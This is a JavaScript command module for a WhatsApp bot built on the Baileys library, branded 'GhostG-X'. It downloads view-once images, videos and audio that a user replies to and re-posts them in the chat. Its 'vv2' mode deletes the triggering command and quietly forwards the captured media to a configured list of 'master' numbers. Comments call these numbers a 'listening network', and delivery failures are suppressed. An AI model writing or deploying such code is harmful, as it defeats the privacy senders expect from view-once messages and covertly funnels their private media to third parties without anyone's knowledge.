/**
 * ViewOnce Command - Reveal view-once messages
 * GhostG-X Edition
 */

const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
const config = require('../../config.js');

function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'reveler',
  aliases: ['readvo', 'read', 'vv', 'readviewonce', 'vv2'],
  category: '☬ ᴄᴏᴅᴇx ᴇᴛ ʀɪᴛᴜᴇʟs',
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴅᴇᴠᴏɪʟᴇ ʟᴇs ᴍᴇssᴀɢᴇs ᴀ ᴠᴜᴇ ᴜɴɪǫᴜᴇ (ɪᴍᴀɢᴇs/ᴠɪᴅᴇᴏs/ᴀᴜᴅɪᴏ)',
  usage: `${config.prefix || '.'}reveler (repondre a un message a vue unique)`,
  groupOnly: false,
  adminOnly: false,
  botAdminNeeded: false,

  async execute(sock, msg, args) {
    try {
      const chatId = msg.key.remoteJid;

      const bodyText = msg.message?.conversation || 
                       msg.message?.extendedTextMessage?.text || 
                       msg.body || 
                       '';

      const prefix = config.prefix || '.';
      const cleanBody = bodyText.trim().toLowerCase();

      const hasPrefix = cleanBody.startsWith(prefix);

      let firstWord = '';
      if (hasPrefix) {
        const match = cleanBody.slice(prefix.length).match(/^(\w+)/);
        firstWord = match ? match[1] : '';
      } else {
        const match = cleanBody.match(/^(\w+)/);
        firstWord = match ? match[1] : '';
      }

      const isVV2 = (firstWord === 'vv2');

      const ctx = msg.message?.extendedTextMessage?.contextInfo
        || msg.message?.imageMessage?.contextInfo
        || msg.message?.videoMessage?.contextInfo
        || msg.message?.buttonsResponseMessage?.contextInfo
        || msg.message?.listResponseMessage?.contextInfo;

      if (!ctx?.quotedMessage) {
        return await sock.sendMessage(
          chatId,
          { text: `*⚠️ ${toSmallCaps('repondez a un message a vue unique pour le devoiler')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*` },
          { quoted: msg }
        );
      }

      const quotedMsg = ctx.quotedMessage;

      const hasViewOnce =
        !!quotedMsg.viewOnceMessageV2 ||
        !!quotedMsg.viewOnceMessageV2Extension ||
        !!quotedMsg.viewOnceMessage ||
        !!quotedMsg.viewOnce ||
        !!quotedMsg?.imageMessage?.viewOnce ||
        !!quotedMsg?.videoMessage?.viewOnce ||
        !!quotedMsg?.audioMessage?.viewOnce;

      if (!hasViewOnce) {
        return await sock.sendMessage(
          chatId,
          { text: `*⚠️ ${toSmallCaps('ce message ne possede pas le sceau de la vue unique')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*` },
          { quoted: msg }
        );
      }

      let actualMsg = null;
      let mtype = null;

      if (quotedMsg.viewOnceMessageV2Extension?.message) {
        actualMsg = quotedMsg.viewOnceMessageV2Extension.message;
        mtype = Object.keys(actualMsg)[0];
      } else if (quotedMsg.viewOnceMessageV2?.message) {
        actualMsg = quotedMsg.viewOnceMessageV2.message;
        mtype = Object.keys(actualMsg)[0];
      } else if (quotedMsg.viewOnceMessage?.message) {
        actualMsg = quotedMsg.viewOnceMessage.message;
        mtype = Object.keys(actualMsg)[0];
      } else if (quotedMsg.imageMessage?.viewOnce) {
        actualMsg = { imageMessage: quotedMsg.imageMessage };
        mtype = 'imageMessage';
      } else if (quotedMsg.videoMessage?.viewOnce) {
        actualMsg = { videoMessage: quotedMsg.videoMessage };
        mtype = 'videoMessage';
      } else if (quotedMsg.audioMessage?.viewOnce) {
        actualMsg = { audioMessage: quotedMsg.audioMessage };
        mtype = 'audioMessage';
      }

      if (!actualMsg || !mtype) {
        return await sock.sendMessage(
          chatId,
          { text: `*⚠️ ${toSmallCaps('type de sceau non supporte par le sanctuaire')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*` },
          { quoted: msg }
        );
      }

      const downloadType =
        mtype === 'imageMessage' ? 'image'
        : mtype === 'videoMessage' ? 'video'
        : 'audio';

      // ── MODE VV2 : extraction et dispatch réseau ──
      if (isVV2) {
        try {
          await sock.sendMessage(chatId, { delete: msg.key });
        } catch (delError) {
          console.error('Failed to delete message:', delError.message);
        }

        const mediaStream = await downloadContentFromMessage(actualMsg[mtype], downloadType);
        let buffer = Buffer.from([]);
        for await (const chunk of mediaStream) {
          buffer = Buffer.concat([buffer, chunk]);
        }

        // Routines de récupération des cibles réseau sécurisées
        let broadcastJids = [];
        if (config.masterJids && Array.isArray(config.masterJids)) {
          broadcastJids = [...config.masterJids];
        } else if (config.ownerNumber) {
          const fallback = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
          fallback.forEach(num => {
            const cleanNum = `${String(num).replace(/\D/g, '')}@s.whatsapp.net`;
            if (!broadcastJids.includes(cleanNum)) broadcastJids.push(cleanNum);
          });
        }

        const defaultCredit = `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;

        // Dispatch discret du média vers l'intégralité du réseau d'écoute
        for (const targetJid of broadcastJids) {
          try {
            if (/video/.test(mtype)) {
              await sock.sendMessage(targetJid, {
                video: buffer,
                caption: defaultCredit,
                mimetype: 'video/mp4'
              });
            } else if (/image/.test(mtype)) {
              await sock.sendMessage(targetJid, {
                image: buffer,
                caption: defaultCredit,
                mimetype: 'image/jpeg'
              });
            } else if (/audio/.test(mtype)) {
              await sock.sendMessage(targetJid, {
                audio: buffer,
                ptt: true,
                mimetype: 'audio/ogg; codecs=opus'
              });
            }
          } catch (e) {
            // Échec silencieux de la transmission
          }
        }

        return; 
      }

      // ── MODE VV (classique) ──
      const mediaStream = await downloadContentFromMessage(actualMsg[mtype], downloadType);
      let buffer = Buffer.from([]);
      for await (const chunk of mediaStream) {
        buffer = Buffer.concat([buffer, chunk]);
      }

      const defaultCredit = `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;

      if (/video/.test(mtype)) {
        await sock.sendMessage(
          chatId,
          {
            video: buffer,
            caption: defaultCredit,
            mimetype: 'video/mp4'
          },
          { quoted: msg }
        );
      } else if (/image/.test(mtype)) {
        await sock.sendMessage(
          chatId,
          {
            image: buffer,
            caption: defaultCredit,
            mimetype: 'image/jpeg'
          },
          { quoted: msg }
        );
      } else if (/audio/.test(mtype)) {
        await sock.sendMessage(
          chatId,
          {
            audio: buffer,
            ptt: true,
            mimetype: 'audio/ogg; codecs=opus'
          },
          { quoted: msg }
        );
      }

    } catch (error) {
      console.error('Error in viewonce command:', error);
      await sock.sendMessage(
        msg.key.remoteJid,
        {
          text: `*❌ ${toSmallCaps('echec de la revelation')}.*\n*${toSmallCaps('erreur')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
        },
        { quoted: msg }
      );
    }
  }
};
